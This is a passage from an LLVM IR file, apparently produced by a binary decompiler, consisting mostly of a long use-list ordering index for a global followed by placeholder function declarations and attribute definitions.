2318, 2319, 2320, 2321, 2322, 2314, 2315, 2323, 2324, 2325, 2326, 2327, 2328, 2329, 2330, 2331, 2332, 47, 2333, 2334, 2335, 2336, 2337, 48, 2338, 2339, 2340, 2341, 2342, 49, 2343, 2344, 2345, 2346, 2347, 2348, 2349, 2350, 2351, 2352, 2353, 2354, 2355, 2356, 2357, 1996, 1997, 2013, 465, 466, 2014, 2015, 156, 1890, 1678, 1679, 1680, 1681, 1682, 259, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1691, 1692, 1693, 1694, 158, 157, 260, 261, 1695, 1696, 1697, 1698, 1699, 1700, 159, 160, 1701, 1702, 1703, 1704, 1705, 1706, 50, 1707, 1708, 1709, 1710, 1711, 67, 262, 1712, 161, 468, 1713, 1714, 1715, 1716, 1717, 469, 263, 1718, 1719, 1720, 1721, 400, 1722, 1723, 1724, 399, 1725, 1726, 398, 1727, 1728, 258, 1729, 467, 1730, 265, 1731, 51, 1732, 395, 386, 1733, 1734, 1735, 470, 471, 1736, 1737, 1738, 396, 397, 1739, 1740, 1741, 264, 1742, 1743, 1744, 1745, 1746, 1747, 2131, 16, 2132, 2133, 2134, 1386, 2135, 2136, 2137, 2138, 2139, 2140, 1749, 1748, 1750, 1751, 1752, 1753, 1754, 1755, 1756, 1757, 1758, 1759, 1760, 1761, 1762, 1763, 162, 1998, 1999, 2000, 17, 2001, 338, 1765, 1764, 339, 1766, 1767, 163, 1768, 266, 268, 1913, 267, 1914, 269, 1879, 164, 1891, 1896, 1897, 1892, 1893, 1894, 1899, 1900, 1901, 270, 1902, 1903, 1904, 1905, 1906, 1895, 1898, 1907, 165, 1446, 1447, 1448, 271, 1449, 1450, 272, 1453, 1457, 1458, 1459, 1460, 273, 1454, 274, 1455, 1456, 166, 1461, 2358, 1978, 1564, 2176, 2177, 2178, 2179, 275, 2180, 2163, 1462, 2164, 2160, 167, 276, 2359, 2360, 2165, 2181, 2182, 168, 277, 472, 2365, 2366, 473, 2367, 2368, 278, 341, 2369, 2370, 474, 94, 2371, 2372, 475, 2380, 2384, 1387, 340, 2385, 476, 2388, 2381, 2382, 2383, 2361, 2362, 1388, 279, 329, 1411, 18, 19, 477, 2166, 280, 1412, 1414, 1413, 281, 1415, 1416, 1417, 478, 1418, 140, 1477, 130, 1478, 283, 282, 1479, 2363, 2364, 1958, 1959, 1960, 1961, 1962, 1963, 285, 169, 1964, 1965, 1966, 131, 284, 1967, 479, 1463, 170, 1464, 171, 1465, 286, 1859, 1860, 1861, 20, 2108, 1466, 1467, 172, 173, 174, 132, 1468, 175, 176, 480, 481, 2375, 401, 177, 178, 2188, 2189, 2190, 2191, 2192, 287, 2193, 2194, 2195, 2196, 2197, 2198, 2199, 288, 2183, 482, 2184, 2185, 483, 2186, 2187, 179, 1979, 484, 289, 1980, 1981, 1982, 1983, 1984, 180, 2200, 2201, 293, 291, 292, 2202, 2203, 299, 298, 215, 290, 2204, 2205, 2206, 2207, 2208, 2209, 388, 387, 402, 485, 2210, 2211, 2212, 95, 2213, 295, 294, 296, 297, 214, 2214, 2215, 342, 2216, 2217, 141, 2218, 2219, 2220, 2221, 2222, 21, 22, 1480, 1481, 96, 181, 23, 403, 486, 2104, 2105, 1565, 2223, 2143, 2120, 1512, 2121, 2152, 2142, 300, 2141, 301, 2022, 302, 68, 303, 1769, 1770, 305, 1771, 1772, 304, 1773, 306, 182, 2249, 2250, 2251, 343, 2095, 2096, 2097, 307, 1774, 1775, 344, 1776, 142, 2109, 2110, 2111, 487, 24, 2386, 2387, 117, 308, 1777, 1778, 1779, 1780, 1781, 309, 2016, 1389, 2017, 2018, 183, 184, 185, 2002, 2003, 2011, 2008, 2009, 2010, 345, 380, 2012, 186, 2006, 2004, 2005, 346, 2007, 187, 1482, 1483, 188, 25, 189, 2019, 2020, 26, 27, 190, 28, 1484, 191, 29, 1782, 1783, 1784, 1785, 1786, 192, 1787, 1788, 1789, 1790, 1792, 1793, 1791, 1794, 193, 1795, 1798, 1796, 1797, 310, 488, 1799, 1800, 1801, 311, 312, 1802, 1803, 1804, 1805, 1806, 1807, 489, 1808, 1809, 490, 1810, 1812, 313, 1811, 347, 330, 1813, 1814, 1816, 194, 1817, 315, 1818, 100, 101, 98, 99, 1819, 491, 136, 133, 1820, 1821, 1822, 318, 316, 317, 492, 1823, 1824, 1825, 97, 314, 1826, 1827, 1828, 1829, 1830, 1831, 1832, 1833, 1834, 493, 137, 370, 108, 1835, 1836, 1837, 30, 319, 1419, 1420, 143, 102, 123, 1815, 348, 195, 1470, 1469, 350, 1472, 1471, 349, 1473, 1474, 494, 1475, 196, 2024, 2025, 2026, 103, 104, 2027, 2028, 2029, 320, 2030, 2031, 2032, 2033, 2034, 495, 2035, 2036, 2037, 2038, 2039, 1838, 2040, 197, 1954, 1955, 1956, 1957, 198, 31, 2167, 2376, 2373, 2023, 1485, 2224, 1476, 2379, 1862, 2374, 2168, 2158, 1486, 2144, 2118, 1487, 496, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 2169, 2377, 138, 2378, 2170, 32, 2225, 2226, 2227, 139, 2228, 2229, 2230, 2231, 2232, 321, 2233, 1390, 1393, 1391, 1392, 2234, 1394, 389, 503, 504, 351, 1499, 502, 52, 53, 505, 1500, 1501, 513, 514, 609, 610, 69, 404, 497, 216, 499, 500, 405, 501, 1502, 352, 199, 506, 1503, 1504, 1505, 1506, 1508, 371, 1507, 1509, 1510, 509, 510, 507, 508, 1511, 498, 511, 512, 322, 406, 353, 1514, 515, 1513, 519, 520, 516, 517, 518, 1515, 521, 1516, 438, 1517, 522, 1518, 523, 70, 124, 200, 201, 202, 407, 524, 408, 323, 1519, 1520, 530, 324, 1521, 1523, 531, 532, 325, 1522, 356, 1524, 533, 1525, 527, 1526, 1528, 528, 529, 1527, 355, 1529, 526, 534, 1530, 1531, 535, 1532, 1534, 536, 537, 1533, 354, 1535, 525, 538, 1536, 1537, 539, 1538, 540, 1539, 1540, 1541, 541, 1542, 1543, 1544, 1545, 1550, 544, 71, 409, 1551, 1557, 543, 1552, 1553, 1554, 1555, 1556, 357, 1558, 545, 439, 1559, 1560, 542, 1561, 546, 1562, 1563, 203, 548, 374, 72, 372, 373, 1566, 144, 440, 1567, 549, 1568, 547, 1569, 550, 377, 73, 375, 376, 1570, 551, 1571, 1572, 552, 1573, 1574, 326, 1839, 1840, 74, 109, 410, 554, 555, 553, 556, 1395, 1396, 568, 1397, 1398, 1399, 1400, 567, 1401, 1402, 1403, 1404, 566, 1405, 1406, 1407, 1408, 563, 564, 557, 565, 562, 358, 1409, 559, 1410, 560, 561, 1360, 1863, 75, 119, 1864, 411, 558, 76, 110, 118, 569, 570, 571, 412, 413, 414, 2106, 441, 2107, 120, 359, 327, 77, 78, 572, 415, 416, 417, 418, 579, 2112, 2114, 2115, 2116, 574, 2117, 575, 576, 577, 573, 360, 578, 2113, 442, 581, 582, 580, 419, 33, 584, 583, 585, 2119, 420, 421, 422, 423, 2122, 588, 586, 587, 361, 2123, 589, 2124, 443, 378, 2128, 2129, 424, 2125, 2126, 590, 591, 592, 2127, 594, 595, 596, 597, 598, 593, 362, 599, 2130, 600, 79, 606, 80, 605, 601, 2145, 604, 364, 607, 602, 2146, 603, 363, 608, 81, 111, 2153, 2154, 444, 2155, 2156, 204, 2157, 82, 445, 2159, 365, 611, 612, 613, 614, 2161, 2162, 390, 615, 2171, 2172, 616, 2173, 617, 2174, 2175, 618, 205, 619, 620, 621, 622, 623, 2245, 206, 83, 379, 366, 427, 428, 2235, 2236, 2237, 367, 425, 426, 429, 2238, 2239, 430, 2240, 2241, 369, 84, 207, 208, 368, 2243, 2244, 446, 209, 85, 624, 2242, 2246, 2247, 431, 432, 1421, 433, 434, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 2389, 2390, 2391, 2392, 2393, 2394, 2395, 2396, 2397, 2398, 2399, 2400, 2401, 2402, 2403 }
  uselistorder i32* @r4, {}
}

declare i32 @unknown_0() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
